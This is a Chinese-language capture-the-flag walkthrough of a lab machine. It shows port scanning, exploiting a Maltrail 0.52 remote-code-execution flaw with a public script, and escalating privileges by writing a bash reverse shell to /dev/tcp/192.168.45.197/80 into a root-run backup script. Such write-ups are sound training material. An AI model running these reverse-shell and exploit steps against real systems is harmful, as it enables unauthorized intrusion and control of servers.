针对目标服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.190.32
```

![image-20241201174737777](https://s2.loli.net/2024/12/01/vCfzxjJIu3ikV2r.png)

针对开放端口进行相应的服务探测

```
sudo nmap -p22,80,8338 -A 192.168.190.32 -oG Ochima.txt
```

![image-20241201174754156](https://s2.loli.net/2024/12/01/3SM6rJRbLBEdV1D.png)

22端口的ssh服务没有可以利用的漏洞，我们重点关注80和8338两个端口的服务

80端口直接访问只有一个apache2的页面，我们针对80端口进行相应的目录扫描

```
dirsearch -u http://192.168.190.32 -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html
```

![image-20241201181016525](https://s2.loli.net/2024/12/01/BqirwvS8YG5Mshn.png)

针对8338端口，我们查看到一个叫maltrail的应用，对应版本号为0.52，让我们搜索下这个软件及对应的版本是否存在可以利用的漏洞

![image-20241201181355871](https://s2.loli.net/2024/12/01/a9iLjydMlQeW7wr.png)

我们搜索到0.53、0.52版本存在一个rce漏洞，我们尝试下是否也可以利用在0.52版本上

https://github.com/spookier/Maltrail-v0.53-Exploit

```
python3 exploit.py 192.168.45.197 80 http://192.168.190.32:8338
```

在这次利用中反复失败，原因就是对方服务器应当有防火墙策略，80以外的端口无法返回shell

![image-20241201183531743](https://s2.loli.net/2024/12/01/RZce8bWPEQtsMXA.png)

这样我们获得了相应的shell，我们进行相应的升级操作

![image-20241201183814947](https://s2.loli.net/2024/12/01/Gboe2u1DSNThHL5.png)

在对应home的用户目录下获取到第一个flag内容，接下来我们需要进行提权操作

![image-20241201184646640](https://s2.loli.net/2024/12/01/NGKUkTPzq9Jmv6l.png)

结合我们在home目录看到的备份tar包，应当就是该文件

![image-20241201184724979](https://s2.loli.net/2024/12/01/34pzWaDqNf2AXst.png)

![image-20241201184748060](https://s2.loli.net/2024/12/01/od9Al31pXUnbgEP.png)

![image-20241201185534217](https://s2.loli.net/2024/12/01/EtKf7Gciwd2Y9eT.png)

我们在文件中写入一个shell反弹

```
echo 'bash -i >& /dev/tcp/192.168.45.197/80 0>&1' > /var/backups/etc_Backup.sh
```

![image-20241201190717027](https://s2.loli.net/2024/12/01/BdsGfh1XrW4IxCJ.png)
